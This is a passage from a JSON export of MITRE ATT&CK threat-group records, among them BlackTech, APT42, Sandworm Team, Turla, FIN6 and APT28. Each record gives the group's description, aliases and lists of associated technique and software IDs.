      "description": "[BlackTech](https://attack.mitre.org/groups/G0098) is a suspected Chinese cyber espionage group that has primarily targeted organizations in East Asia--particularly Taiwan, Japan, and Hong Kong--and the US since at least 2013. [BlackTech](https://attack.mitre.org/groups/G0098) has used a combination of custom malware, dual-use tools, and living off the land tactics to compromise media, construction, engineering, electronics, and financial company networks.(Citation: TrendMicro BlackTech June 2017)(Citation: Symantec Palmerworm Sep 2020)(Citation: Reuters Taiwan BlackTech August 2020)",
      "aliases": [
        "BlackTech",
        "Palmerworm"
      ],
      "techniques": [
        "T1566.002",
        "T1204.001",
        "T1588.003",
        "T1046",
        "T1588.002",
        "T1190",
        "T1021.004",
        "T1106",
        "T1203",
        "T1566.001",
        "T1036.002",
        "T1574.001",
        "T1204.002",
        "T1588.004"
      ],
      "software": [
        "S0029",
        "S0435",
        "S0437",
        "S0436",
        "S0696",
        "S0579"
      ],
      "url": "https://attack.mitre.org/groups/G0098",
      "stix_id": "intrusion-set--6fe8a2a1-a1b0-4af8-953d-4babd329f8f8",
      "created": "2020-05-05T18:36:45.970000+00:00",
      "modified": "2025-04-25T19:03:07.787000+00:00"
    },
    "G1044": {
      "id": "G1044",
      "name": "APT42",
      "description": "[APT42](https://attack.mitre.org/groups/G1044) is an Iranian-sponsored threat group that conducts cyber espionage and surveillance.(Citation: Mandiant APT42-charms) The group primarily focuses on targets in the Middle East region, but has targeted a variety of industries and countries since at least 2015.(Citation: Mandiant APT42-charms) [APT42](https://attack.mitre.org/groups/G1044) starts cyber operations through spearphishing emails and/or the PINEFLOWER Android malware, then monitors and collects information from the compromised systems and devices.(Citation: Mandiant APT42-charms) Finally, [APT42](https://attack.mitre.org/groups/G1044) exfiltrates data using native features and open-source tools.(Citation: Mandiant APT42-untangling) \n\n[APT42](https://attack.mitre.org/groups/G1044) activities have been linked to [Magic Hound](https://attack.mitre.org/groups/G0059) by other commercial vendors. While there are behavior and software overlaps between [Magic Hound](https://attack.mitre.org/groups/G0059) and [APT42](https://attack.mitre.org/groups/G1044), they appear to be distinct entities and are tracked as separate entities by their originating vendor. ",
      "aliases": [
        "APT42"
      ],
      "techniques": [
        "T1059.001",
        "T1518.001",
        "T1036.005",
        "T1070",
        "T1056",
        "T1583.001",
        "T1132.001",
        "T1530",
        "T1059.005",
        "T1113",
        "T1016",
        "T1087.001",
        "T1585.002",
        "T1053.005",
        "T1656",
        "T1070.008",
        "T1056.001",
        "T1102",
        "T1082",
        "T1071.001",
        "T1583.003",
        "T1573.002",
        "T1047",
        "T1539",
        "T1608.001",
        "T1588.002",
        "T1111",
        "T1547",
        "T1112",
        "T1566.002",
        "T1555.003"
      ],
      "software": [
        "S1192",
        "S1193"
      ],
      "url": "https://attack.mitre.org/groups/G1044",
      "stix_id": "intrusion-set--c0291346-defe-48d7-9542-9e074ba1bdfb",
      "created": "2025-01-08T17:08:26.378000+00:00",
      "modified": "2025-03-08T18:42:45.320000+00:00"
    },
    "G1026": {
      "id": "G1026",
      "name": "Malteiro",
      "description": "[Malteiro](https://attack.mitre.org/groups/G1026) is a financially motivated criminal group that is likely based in Brazil and has been active since at least November 2019. The group operates and distributes the [Mispadu](https://attack.mitre.org/software/S1122)  banking trojan via a Malware-as-a-Service (MaaS) business model. [Malteiro](https://attack.mitre.org/groups/G1026) mainly targets victims throughout Latin America (particularly Mexico) and Europe (particularly Spain and Portugal).(Citation: SCILabs Malteiro 2021)",
      "aliases": [
        "Malteiro"
      ],
      "techniques": [
        "T1204.002",
        "T1555.003",
        "T1055.001",
        "T1657",
        "T1082",
        "T1059.005",
        "T1027.013",
        "T1518.001",
        "T1566.001",
        "T1555",
        "T1140",
        "T1614.001"
      ],
      "software": [
        "S1122"
      ],
      "url": "https://attack.mitre.org/groups/G1026",
      "stix_id": "intrusion-set--bf668120-e9a6-4017-a014-bfc0f5232656",
      "created": "2024-03-13T20:23:54.698000+00:00",
      "modified": "2024-03-29T14:10:35.711000+00:00"
    },
    "G1006": {
      "id": "G1006",
      "name": "Earth Lusca",
      "description": "[Earth Lusca](https://attack.mitre.org/groups/G1006) is a suspected China-based cyber espionage group that has been active since at least April 2019. [Earth Lusca](https://attack.mitre.org/groups/G1006) has targeted organizations in Australia, China, Hong Kong, Mongolia, Nepal, the Philippines, Taiwan, Thailand, Vietnam, the United Arab Emirates, Nigeria, Germany, France, and the United States. Targets included government institutions, news media outlets, gambling companies, educational institutions, COVID-19 research organizations, telecommunications companies, religious movements banned in China, and cryptocurrency trading platforms; security researchers assess some [Earth Lusca](https://attack.mitre.org/groups/G1006) operations may be financially motivated.(Citation: TrendMicro EarthLusca 2022)\n\n[Earth Lusca](https://attack.mitre.org/groups/G1006) has used malware commonly used by other Chinese threat groups, including [APT41](https://attack.mitre.org/groups/G0096) and the [Winnti Group](https://attack.mitre.org/groups/G0044) cluster, however security researchers assess [Earth Lusca](https://attack.mitre.org/groups/G1006)'s techniques and infrastructure are separate.(Citation: TrendMicro EarthLusca 2022)",
      "aliases": [
        "Earth Lusca",
        "TAG-22",
        "Charcoal Typhoon",
        "CHROMIUM",
        "ControlX"
      ],
      "techniques": [
        "T1583.006",
        "T1027.003",
        "T1608.001",
        "T1098.004",
        "T1003.006",
        "T1059.005",
        "T1189",
        "T1018",
        "T1584.006",
        "T1059.007",
        "T1210",
        "T1036.005",
        "T1140",
        "T1583.001",
        "T1033",
        "T1547.012",
        "T1059.001",
        "T1059.006",
        "T1057",
        "T1053",
        "T1574.001",
        "T1112",
        "T1047",
        "T1003.001",
        "T1218.005",
        "T1482",
        "T1567.002",
        "T1548.002",
        "T1588.002",
        "T1007",
        "T1204.002",
        "T1190",
        "T1090",
        "T1027",
        "T1543.003",
        "T1566.002",
        "T1560.001",
        "T1583.004",
        "T1049",
        "T1595.002",
        "T1016",
        "T1588.001",
        "T1584.004",
        "T1204.001"
      ],
      "software": [
        "S0002",
        "S0194",
        "S0057",
        "S0160",
        "S0359",
        "S0590",
        "S0154",
        "S0430",
        "S0596"
      ],
      "url": "https://attack.mitre.org/groups/G1006",
      "stix_id": "intrusion-set--cc613a49-9bfa-4e22-98d1-15ffbb03f034",
      "created": "2022-07-01T20:12:30.184000+00:00",
      "modified": "2024-09-16T16:18:00.876000+00:00"
    },
    "G1040": {
      "id": "G1040",
      "name": "Play",
      "description": "[Play](https://attack.mitre.org/groups/G1040) is a ransomware group that has been active since at least 2022 deploying  [Playcrypt](https://attack.mitre.org/software/S1162) ransomware against the business, government, critical infrastructure, healthcare, and media sectors in North America, South America, and Europe. [Play](https://attack.mitre.org/groups/G1040) actors employ a double-extortion model, encrypting systems after exfiltrating data, and are presumed by security researchers to operate as a closed group.(Citation: CISA Play Ransomware Advisory December 2023)(Citation: Trend Micro Ransomware Spotlight Play July 2023)",
      "aliases": [
        "Play"
      ],
      "techniques": [
        "T1030",
        "T1016",
        "T1048",
        "T1070.004",
        "T1059.003",
        "T1059.001",
        "T1560.001",
        "T1018",
        "T1057",
        "T1027.010",
        "T1587.001",
        "T1078.003",
        "T1562.001",
        "T1021.002",
        "T1078",
        "T1105",
        "T1078.002",
        "T1082",
        "T1083",
        "T1518.001",
        "T1133",
        "T1588.002",
        "T1190",
        "T1003.001",
        "T1657",
        "T1070.001"
      ],
      "software": [
        "S0359",
        "S0552",
        "S0029",
        "S0363",
        "S0645",
        "S0521",
        "S0002",
        "S0154",
        "S1162"
      ],
      "url": "https://attack.mitre.org/groups/G1040",
      "stix_id": "intrusion-set--ecbf507f-6786-4121-a4cc-0fd6a8d3a29d",
      "created": "2024-09-24T19:48:18.278000+00:00",
      "modified": "2024-10-02T05:37:34.149000+00:00"
    },
    "G0034": {
      "id": "G0034",
      "name": "Sandworm Team",
      "description": "[Sandworm Team](https://attack.mitre.org/groups/G0034) is a destructive threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455.(Citation: US District Court Indictment GRU Unit 74455 October 2020)(Citation: UK NCSC Olympic Attacks October 2020) This group has been active since at least 2009.(Citation: iSIGHT Sandworm 2014)(Citation: CrowdStrike VOODOO BEAR)(Citation: USDOJ Sandworm Feb 2020)(Citation: NCSC Sandworm Feb 2020)\n\nIn October 2020, the US indicted six GRU Unit 74455 officers associated with [Sandworm Team](https://attack.mitre.org/groups/G0034) for the following cyber operations: the 2015 and 2016 attacks against Ukrainian electrical companies and government organizations, the 2017 worldwide [NotPetya](https://attack.mitre.org/software/S0368) attack, targeting of the 2017 French presidential campaign, the 2018 [Olympic Destroyer](https://attack.mitre.org/software/S0365) attack against the Winter Olympic Games, the 2018 operation against the Organisation for the Prohibition of Chemical Weapons, and attacks against the country of Georgia in 2018 and 2019.(Citation: US District Court Indictment GRU Unit 74455 October 2020)(Citation: UK NCSC Olympic Attacks October 2020) Some of these were conducted with the assistance of GRU Unit 26165, which is also referred to as [APT28](https://attack.mitre.org/groups/G0007).(Citation: US District Court Indictment GRU Oct 2018)",
      "aliases": [
        "Sandworm Team",
        "ELECTRUM",
        "Telebots",
        "IRON VIKING",
        "BlackEnergy (Group)",
        "Quedagh",
        "Voodoo Bear",
        "IRIDIUM",
        "Seashell Blizzard",
        "FROZENBARENTS",
        "APT44"
      ],
      "techniques": [
        "T1608.001",
        "T1588.006",
        "T1040",
        "T1027.010",
        "T1595.002",
        "T1585.001",
        "T1586.001",
        "T1132.001",
        "T1213",
        "T1539",
        "T1059.001",
        "T1090",
        "T1203",
        "T1041",
        "T1053.005",
        "T1190",
        "T1078.002",
        "T1003.003",
        "T1036",
        "T1598.003",
        "T1133",
        "T1587.001",
        "T1072",
        "T1584.005",
        "T1566.002",
        "T1018",
        "T1589.003",
        "T1078",
        "T1566.001",
        "T1204.002",
        "T1106",
        "T1588.002",
        "T1583.004",
        "T1590.001",
        "T1083",
        "T1049",
        "T1555.003",
        "T1489",
        "T1571",
        "T1070.004",
        "T1047",
        "T1087.003",
        "T1021.002",
        "T1204.001",
        "T1505.003",
        "T1218.011",
        "T1499",
        "T1195.002",
        "T1199",
        "T1056.001",
        "T1561.002",
        "T1486",
        "T1592.002",
        "T1491.002",
        "T1583",
        "T1219",
        "T1584.004",
        "T1003.001",
        "T1594",
        "T1570",
        "T1027",
        "T1591.002",
        "T1585.002",
        "T1102.002",
        "T1490",
        "T1583.001",
        "T1140",
        "T1485",
        "T1059.005",
        "T1105",
        "T1033",
        "T1589.002",
        "T1071.001",
        "T1087.002",
        "T1082",
        "T1005",
        "T1195",
        "T1593",
        "T1036.005",
        "T1566.001",
        "T1112",
        "T1070.004",
        "T1018",
        "T1133",
        "T1105",
        "T1204.002",
        "T1078",
        "T1040",
        "T1136.002",
        "T1218.011",
        "T1059.005",
        "T1071.001",
        "T1570",
        "T1056.001",
        "T1055",
        "T1562.001",
        "T1059.005",
        "T1036.008",
        "T1059.001",
        "T1036.005",
        "T1505.001",
        "T1136",
        "T1570",
        "T1059.003",
        "T1027",
        "T1543.003",
        "T1027.002",
        "T1036.010",
        "T1003.001",
        "T1047",
        "T1098",
        "T1110",
        "T1136.002",
        "T1018",
        "T1554",
        "T1562.002",
        "T1021.002",
        "T1036.004",
        "T1059.001",
        "T1053.005",
        "T1543.002",
        "T1505.003",
        "T1095",
        "T1572",
        "T1485",
        "T1570",
        "T1484.001"
      ],
      "software": [
        "S0002",
        "S0029",
        "S0195",
        "S0363",
        "S0039",
        "S0378",
        "S0357",
        "S0231",
        "S0606",
        "S0401",
        "S0343",
        "S0342",
        "S1058",
        "S0598",
        "S1167",
        "S1010",
        "S1189",
        "S0687",
        "S1190",
        "S1125",
        "S0604",
        "S1072",
        "S0089",
        "S0154",
        "S0368",
        "S0607",
        "S0365",
        "S0607",
        "S0089",
        "S0604",
        "S0693"
      ],
      "url": "https://attack.mitre.org/groups/G0034",
      "stix_id": "intrusion-set--381fcf73-60f6-4ab2-9991-6af3cbc35192",
      "created": "2017-05-31T21:32:04.588000+00:00",
      "modified": "2024-12-04T21:17:08.593000+00:00"
    },
    "G1037": {
      "id": "G1037",
      "name": "TA577",
      "description": "[TA577](https://attack.mitre.org/groups/G1037) is an initial access broker (IAB) that has distributed [QakBot](https://attack.mitre.org/software/S0650) and [Pikabot](https://attack.mitre.org/software/S1145), and was among the first observed groups distributing [Latrodectus](https://attack.mitre.org/software/S1160) in 2023.(Citation: Latrodectus APR 2024)",
      "aliases": [
        "TA577"
      ],
      "techniques": [
        "T1059.007",
        "T1059.003",
        "T1027.009",
        "T1586.002",
        "T1204.001",
        "T1566.002"
      ],
      "software": [
        "S1145",
        "S0650",
        "S1160"
      ],
      "url": "https://attack.mitre.org/groups/G1037",
      "stix_id": "intrusion-set--13ef3485-70d2-4567-b934-0e83c1eafcf1",
      "created": "2024-09-17T16:05:53.084000+00:00",
      "modified": "2024-09-17T16:07:34.686000+00:00"
    },
    "G0010": {
      "id": "G0010",
      "name": "Turla",
      "description": "[Turla](https://attack.mitre.org/groups/G0010) is a cyber espionage threat group that has been attributed to Russia's Federal Security Service (FSB).  They have compromised victims in over 50 countries since at least 2004, spanning a range of industries including government, embassies, military, education, research and pharmaceutical companies. [Turla](https://attack.mitre.org/groups/G0010) is known for conducting watering hole and spearphishing campaigns, and leveraging in-house tools and malware, such as [Uroburos](https://attack.mitre.org/software/S0022).(Citation: Kaspersky Turla)(Citation: ESET Gazer Aug 2017)(Citation: CrowdStrike VENOMOUS BEAR)(Citation: ESET Turla Mosquito Jan 2018)(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023)",
      "aliases": [
        "Turla",
        "IRON HUNTER",
        "Group 88",
        "Waterbug",
        "WhiteBear",
        "Snake",
        "Krypton",
        "Venomous Bear",
        "Secret Blizzard",
        "BELUGASTURGEON"
      ],
      "techniques": [
        "T1584.006",
        "T1112",
        "T1069.001",
        "T1140",
        "T1588.002",
        "T1059.007",
        "T1134.002",
        "T1562.001",
        "T1059.005",
        "T1546.013",
        "T1583.006",
        "T1055.001",
        "T1105",
        "T1555.004",
        "T1090",
        "T1068",
        "T1615",
        "T1049",
        "T1106",
        "T1071.003",
        "T1021.002",
        "T1547.001",
        "T1005",
        "T1012",
        "T1007",
        "T1110",
        "T1570",
        "T1189",
        "T1584.004",
        "T1087.002",
        "T1564.012",
        "T1120",
        "T1567.002",
        "T1102.002",
        "T1071.001",
        "T1124",
        "T1087.001",
        "T1204.001",
        "T1090.001",
        "T1546.003",
        "T1560.001",
        "T1059.003",
        "T1057",
        "T1016",
        "T1587.001",
        "T1025",
        "T1518.001",
        "T1059.001",
        "T1027.010",
        "T1059.006",
        "T1213",
        "T1018",
        "T1588.001",
        "T1069.002",
        "T1027.011",
        "T1547.004",
        "T1553.006",
        "T1566.002",
        "T1016.001",
        "T1102",
        "T1082",
        "T1584.003",
        "T1036.005",
        "T1055",
        "T1078.003",
        "T1201",
        "T1083",
        "T1027.005"
      ],
      "software": [
        "S0029",
        "S0102",
        "S0104",
        "S0160",
        "S0363",
        "S0581",
        "S0099",
        "S0096",
        "S0002",
        "S0057",
        "S0039",
        "S0075",
        "S0590",
        "S0126",
        "S0256",
        "S1075",
        "S1141",
        "S0538",
        "S0022",
        "S0393",
        "S0168",
        "S0265",
        "S0395",
        "S0335",
        "S1142",
        "S0537",
        "S0091",
        "S0668",
        "S0587",
        "S1143"
      ],
      "url": "https://attack.mitre.org/groups/G0010",
      "stix_id": "intrusion-set--7a19ecb1-3c65-4de3-a230-993516aed6a6",
      "created": "2017-05-31T21:31:49.816000+00:00",
      "modified": "2024-06-26T18:09:33.862000+00:00"
    },
    "G0039": {
      "id": "G0039",
      "name": "Suckfly",
      "description": "[Suckfly](https://attack.mitre.org/groups/G0039) is a China-based threat group that has been active since at least 2014. (Citation: Symantec Suckfly March 2016)",
      "aliases": [
        "Suckfly"
      ],
      "techniques": [
        "T1059.003",
        "T1078",
        "T1046",
        "T1003",
        "T1553.002"
      ],
      "software": [
        "S0118"
      ],
      "url": "https://attack.mitre.org/groups/G0039",
      "stix_id": "intrusion-set--5cbe0d3b-6fb1-471f-b591-4b192915116d",
      "created": "2017-05-31T21:32:06.777000+00:00",
      "modified": "2025-04-16T20:37:33.565000+00:00"
    },
    "G1003": {
      "id": "G1003",
      "name": "Ember Bear",
      "description": "[Ember Bear](https://attack.mitre.org/groups/G1003) is a Russian state-sponsored cyber espionage group that has been active since at least 2020, linked to Russia's General Staff Main Intelligence Directorate (GRU) 161st Specialist Training Center (Unit 29155).(Citation: CISA GRU29155 2024) [Ember Bear](https://attack.mitre.org/groups/G1003) has primarily focused operations against Ukrainian government and telecommunication entities, but has also operated against critical infrastructure entities in Europe and the Americas.(Citation: Cadet Blizzard emerges as novel threat actor) [Ember Bear](https://attack.mitre.org/groups/G1003) conducted the [WhisperGate](https://attack.mitre.org/software/S0689) destructive wiper attacks against Ukraine in early 2022.(Citation: CrowdStrike Ember Bear Profile March 2022)(Citation: Mandiant UNC2589 March 2022)(Citation: CISA GRU29155 2024) There is some confusion as to whether [Ember Bear](https://attack.mitre.org/groups/G1003) overlaps with another Russian-linked entity referred to as [Saint Bear](https://attack.mitre.org/groups/G1031). At present available evidence strongly suggests these are distinct activities with different behavioral profiles.(Citation: Cadet Blizzard emerges as novel threat actor)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )",
      "aliases": [
        "Ember Bear",
        "UNC2589",
        "Bleeding Bear",
        "DEV-0586",
        "Cadet Blizzard",
        "Frozenvista",
        "UAC-0056"
      ],
      "techniques": [
        "T1018",
        "T1003",
        "T1090.003",
        "T1114",
        "T1583",
        "T1560",
        "T1036",
        "T1595.002",
        "T1583.003",
        "T1654",
        "T1190",
        "T1133",
        "T1119",
        "T1571",
        "T1070.004",
        "T1570",
        "T1095",
        "T1125",
        "T1572",
        "T1110",
        "T1588.001",
        "T1110.003",
        "T1595.001",
        "T1505.003",
        "T1585",
        "T1491.002",
        "T1053.005",
        "T1210",
        "T1059.001",
        "T1112",
        "T1071.004",
        "T1550.002",
        "T1567.002",
        "T1588.005",
        "T1195",
        "T1562.001",
        "T1005",
        "T1561.002",
        "T1203",
        "T1036.005",
        "T1552.001",
        "T1003.001",
        "T1047",
        "T1021",
        "T1003.004",
        "T1003.002",
        "T1078.001",
        "T1046"
      ],
      "software": [
        "S0488",
        "S0174",
        "S0508",
        "S0029",
        "S1040",
        "S0521",
        "S0357",
        "S0598",
        "S1187",
        "S0689",
        "S1018"
      ],
      "url": "https://attack.mitre.org/groups/G1003",
      "stix_id": "intrusion-set--a7f57cc1-4540-4429-823f-f4e56b8473c9",
      "created": "2022-06-09T14:49:57.704000+00:00",
      "modified": "2025-04-25T19:03:38.177000+00:00"
    },
    "G0139": {
      "id": "G0139",
      "name": "TeamTNT",
      "description": "[TeamTNT](https://attack.mitre.org/groups/G0139) is a threat group that has primarily targeted cloud and containerized environments. The group as been active since at least October 2019 and has mainly focused its efforts on leveraging cloud and container resources to deploy cryptocurrency miners in victim environments.(Citation: Palo Alto Black-T October 2020)(Citation: Lacework TeamTNT May 2021)(Citation: Intezer TeamTNT September 2020)(Citation: Cado Security TeamTNT Worm August 2020)(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro TeamTNT)(Citation: ATT TeamTNT Chimaera September 2020)(Citation: Aqua TeamTNT August 2020)(Citation: Intezer TeamTNT Explosion September 2021)",
      "aliases": [
        "TeamTNT"
      ],
      "techniques": [
        "T1133",
        "T1219",
        "T1569.003",
        "T1036.005",
        "T1222.002",
        "T1070.004",
        "T1609",
        "T1059.004",
        "T1547.001",
        "T1543.002",
        "T1136.001",
        "T1007",
        "T1049",
        "T1562.004",
        "T1543.003",
        "T1608.001",
        "T1059.003",
        "T1610",
        "T1613",
        "T1048",
        "T1057",
        "T1059.001",
        "T1552.005",
        "T1070.003",
        "T1074.001",
        "T1595.002",
        "T1027.002",
        "T1204.003",
        "T1014",
        "T1552.004",
        "T1562.001",
        "T1611",
        "T1070.002",
        "T1595.001",
        "T1105",
        "T1518.001",
        "T1496.001",
        "T1083",
        "T1021.004",
        "T1036",
        "T1140",
        "T1082",
        "T1027.013",
        "T1016",
        "T1046",
        "T1120",
        "T1071",
        "T1098.004",
        "T1583.001",
        "T1059.009",
        "T1071.001",
        "T1552.001",
        "T1587.001",
        "T1102"
      ],
      "software": [
        "S0683",
        "S0179",
        "S0349",
        "S0601"
      ],
      "url": "https://attack.mitre.org/groups/G0139",
      "stix_id": "intrusion-set--35d1b3be-49d4-42f1-aaa6-ef159c880bca",
      "created": "2021-10-01T01:57:31.229000+00:00",
      "modified": "2024-09-16T16:23:56.908000+00:00"
    },
    "G0037": {
      "id": "G0037",
      "name": "FIN6",
      "description": "[FIN6](https://attack.mitre.org/groups/G0037) is a cyber crime group that has stolen payment card data and sold it for profit on underground marketplaces. This group has aggressively targeted and compromised point of sale (PoS) systems in the hospitality and retail sectors.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019)",
      "aliases": [
        "FIN6",
        "Magecart Group 6",
        "ITG08",
        "Skeleton Spider",
        "TAAL",
        "Camouflage Tempest"
      ],
      "techniques": [
        "T1560.003",
        "T1566.001",
        "T1087.002",
        "T1059",
        "T1572",
        "T1213",
        "T1027.010",
        "T1059.007",
        "T1102",
        "T1005",
        "T1547.001",
        "T1059.003",
        "T1588.002",
        "T1070.004",
        "T1003.003",
        "T1134",
        "T1562.001",
        "T1068",
        "T1204.002",
        "T1036.004",
        "T1566.003",
        "T1059.001",
        "T1560",
        "T1553.002",
        "T1021.001",
        "T1119",
        "T1018",
        "T1053.005",
        "T1569.002",
        "T1046",
        "T1048.003",
        "T1047",
        "T1110.002",
        "T1555",
        "T1095",
        "T1078",
        "T1573.002",
        "T1003.001",
        "T1555.003",
        "T1074.002"
      ],
      "software": [
        "S0005",
        "S0552",
        "S0029",
        "S0002",
        "S0381",
        "S0632",
        "S0503",
        "S0284",
        "S0154",
        "S0449",
        "S0372",
        "S0446"
      ],
      "url": "https://attack.mitre.org/groups/G0037",
      "stix_id": "intrusion-set--2a7914cf-dff3-428d-ab0f-1014d1c28aeb",
      "created": "2017-05-31T21:32:06.015000+00:00",
      "modified": "2024-11-17T14:59:25.749000+00:00"
    },
    "G0091": {
      "id": "G0091",
      "name": "Silence",
      "description": "[Silence](https://attack.mitre.org/groups/G0091) is a financially motivated threat actor targeting financial institutions in different countries. The group was first seen in June 2016. Their main targets reside in Russia, Ukraine, Belarus, Azerbaijan, Poland and Kazakhstan. They compromised various banking systems, including the Russian Central Bank's Automated Workstation Client, ATMs, and card processing.(Citation: Cyber Forensicator Silence Jan 2019)(Citation: SecureList Silence Nov 2017) ",
      "aliases": [
        "Silence",
        "Whisper Spider"
      ],
      "techniques": [
        "T1571",
        "T1053.005",
        "T1055",
        "T1547.001",
        "T1059.005",
        "T1112",
        "T1021.001",
        "T1125",
        "T1059.007",
        "T1218.001",
        "T1072",
        "T1113",
        "T1027.010",
        "T1569.002",
        "T1090.002",
        "T1553.002",
        "T1105",
        "T1078",
        "T1018",
        "T1003.001",
        "T1059.001",
        "T1588.002",
        "T1070.004",
        "T1566.001",
        "T1036.005",
        "T1204.002",
        "T1059.003",
        "T1106"
      ],
      "software": [
        "S0363",
        "S0191",
        "S0195"
      ],
      "url": "https://attack.mitre.org/groups/G0091",
      "stix_id": "intrusion-set--d13c8a7f-740b-4efa-a232-de7d6bb05321",
      "created": "2019-05-24T17:57:36.491000+00:00",
      "modified": "2024-11-17T18:19:52.955000+00:00"
    },
    "G0040": {
      "id": "G0040",
      "name": "Patchwork",
      "description": "[Patchwork](https://attack.mitre.org/groups/G0040) is a cyber espionage group that was first observed in December 2015. While the group has not been definitively attributed, circumstantial evidence suggests the group may be a pro-Indian or Indian entity. [Patchwork](https://attack.mitre.org/groups/G0040) has been seen targeting industries related to diplomatic and government agencies. Much of the code used by this group was copied and pasted from online forums. [Patchwork](https://attack.mitre.org/groups/G0040) was also seen operating spearphishing campaigns targeting U.S. think tank groups in March and April of 2018.(Citation: Cymmetria Patchwork) (Citation: Symantec Patchwork)(Citation: TrendMicro Patchwork Dec 2017)(Citation: Volexity Patchwork June 2018)",
      "aliases": [
        "Patchwork",
        "Hangover Group",
        "Dropping Elephant",
        "Chinastrats",
        "MONSOON",
        "Operation Hangover"
      ],
      "techniques": [
        "T1059.005",
        "T1560",
        "T1083",
        "T1553.002",
        "T1574.001",
        "T1112",
        "T1197",
        "T1027.005",
        "T1555.003",
        "T1053.005",
        "T1132.001",
        "T1055.012",
        "T1021.001",
        "T1547.001",
        "T1074.001",
        "T1036.005",
        "T1566.001",
        "T1027.010",
        "T1588.002",
        "T1189",
        "T1204.001",
        "T1518.001",
        "T1203",
        "T1027.002",
        "T1033",
        "T1005",
        "T1204.002",
        "T1587.002",
        "T1070.004",
        "T1119",
        "T1102.001",
        "T1059.003",
        "T1027.001",
        "T1548.002",
        "T1059.001",
        "T1598.003",
        "T1105",
        "T1566.002",
        "T1082",
        "T1559.002"
      ],
      "software": [
        "S0262",
        "S0194",
        "S0272",
        "S0475",
        "S0131",
        "S0129",
        "S0128",
        "S0130"
      ],
      "url": "https://attack.mitre.org/groups/G0040",
      "stix_id": "intrusion-set--17862c7d-9e60-48a0-b48e-da4dc4c3f6b0",
      "created": "2017-05-31T21:32:07.145000+00:00",
      "modified": "2024-11-17T23:51:01.110000+00:00"
    },
    "G0007": {
      "id": "G0007",
      "name": "APT28",
      "description": "[APT28](https://attack.mitre.org/groups/G0007) is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165.(Citation: NSA/FBI Drovorub August 2020)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) This group has been active since at least 2004.(Citation: DOJ GRU Indictment Jul 2018)(Citation: Ars Technica GRU indictment Jul 2018)(Citation: Crowdstrike DNC June 2016)(Citation: FireEye APT28)(Citation: SecureWorks TG-4127)(Citation: FireEye APT28 January 2017)(Citation: GRIZZLY STEPPE JAR)(Citation: Sofacy DealersChoice)(Citation: Palo Alto Sofacy 06-2018)(Citation: Symantec APT28 Oct 2018)(Citation: ESET Zebrocy May 2019)\n\n[APT28](https://attack.mitre.org/groups/G0007) reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election.(Citation: Crowdstrike DNC June 2016) In 2018, the US indicted five GRU Unit 26165 officers associated with [APT28](https://attack.mitre.org/groups/G0007) for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations.(Citation: US District Court Indictment GRU Oct 2018) Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as [Sandworm Team](https://attack.mitre.org/groups/G0034). ",
      "aliases": [
        "APT28",
        "IRON TWILIGHT",
        "SNAKEMACKEREL",
        "Swallowtail",
        "Group 74",
        "Sednit",
        "Sofacy",
        "Pawn Storm",
        "Fancy Bear",
        "STRONTIUM",
        "Tsar Team",
        "Threat Group-4127",
        "TG-4127",
        "Forest Blizzard",
        "FROZENLAKE",
        "GruesomeLarch"
      ],
      "techniques": [
        "T1003.003",
        "T1589.001",
        "T1591",
        "T1564.001",
        "T1583.003",
        "T1596",
        "T1583.001",
        "T1070.006",
        "T1090.002",
        "T1566.001",
        "T1059.001",
        "T1048.002",
        "T1547.001",
        "T1027.013",
        "T1203",
        "T1586.002",
        "T1114.002",
        "T1505.003",
        "T1584.008",
        "T1550.002",
        "T1037.001",
        "T1588.002",
        "T1564.003",
        "T1090.003",
        "T1567",
        "T1056.001",
        "T1083",
        "T1190",
        "T1669",
        "T1039",
        "T1113",
        "T1110.001",
        "T1070.001",
        "T1583.006",
        "T1057",
        "T1189",
        "T1595.002",
        "T1546.015",
        "T1199",
        "T1120",
        "T1059.003",
        "T1557.004",
        "T1498",
        "T1070.004",
        "T1560",
        "T1105",
        "T1598",
        "T1559.002",
        "T1036.005",
        "T1119",
        "T1078.004",
        "T1221",
        "T1005",
        "T1213.002",
        "T1078",
        "T1025",
        "T1071.001",
        "T1213",
        "T1218.011",
        "T1560.001",
        "T1140",
        "T1598.003",
        "T1542.003",
        "T1071.003",
        "T1036",
        "T1210",
        "T1014",
        "T1204.002",
        "T1550.001",
        "T1030",
        "T1134.001",
        "T1074.002",
        "T1092",
        "T1098.002",
        "T1003",
        "T1040",
        "T1068",
        "T1137.002",
        "T1528",
        "T1110.003",
        "T1204.001",
        "T1133",
        "T1102.002",
        "T1001.001",
        "T1211",
        "T1003.001",
        "T1573.001",
        "T1074.001",
        "T1091",
        "T1110",
        "T1021.002",
        "T1003.003",
        "T1567",
        "T1059.001",
        "T1560.001",
        "T1059.003",
        "T1110.003",
        "T1016.002",
        "T1562.004",
        "T1669",
        "T1140",
        "T1074.001",
        "T1021.001",
        "T1003.002",
        "T1561.001",
        "T1584",
        "T1021.002",
        "T1090.001",
        "T1006"
      ],
      "software": [
        "S0645",
        "S0160",
        "S0039",
        "S0193",
        "S0002",
        "S0250",
        "S0191",
        "S0174",
        "S1205",
        "S0183",
        "S0023",
        "S0243",
        "S0045",
        "S0351",
        "S0162",
        "S0135",
        "S0044",
        "S0117",
        "S0502",
        "S0137",
        "S0138",
        "S0134",
        "S0161",
        "S0136",
        "S0251",
        "S1187",
        "S0410",
        "S0397",
        "S0108",
        "S1205"
      ],
      "url": "https://attack.mitre.org/groups/G0007",
      "stix_id": "intrusion-set--bef4c620-0787-42a8-a96d-b7eb6e85917c",
      "created": "2017-05-31T21:31:48.664000+00:00",
      "modified": "2025-03-10T20:15:06.958000+00:00"
    },
    "G1007": {
      "id": "G1007",
      "name": "Aoqin Dragon",
